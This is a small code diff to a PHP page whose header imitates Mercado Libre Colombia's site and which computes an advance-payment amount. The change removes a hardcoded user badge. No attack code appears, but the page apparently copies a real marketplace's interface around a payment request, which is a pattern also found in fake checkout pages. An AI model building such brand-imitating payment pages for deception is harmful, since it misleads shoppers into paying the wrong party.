@@ -390,7 +390,7 @@ $anticipo_formateado = number_format($anticipo_pagar, 0, ',', '.');
         <div class="nav-bounds">
             <a href="https://www.mercadolibre.com.co" target="_blank" class="nav-logo"></a>
             <div class="nav-user">
-                <span style="background: #fff; border-radius:12px; padding:2px 8px; font-weight:600;">AG</span> Amir ⌵ &nbsp;&nbsp; <a href="https://www.mercadolibre.com.co/ayuda" target="_blank" style="color:#333; text-decoration:none; font-weight:600;">Ayuda / PQR</a>
+                <a href="https://www.mercadolibre.com.co/ayuda" target="_blank" style="color:#333; text-decoration:none; font-weight:600;">Ayuda / PQR</a>
             </div>
         </div>
     </header>
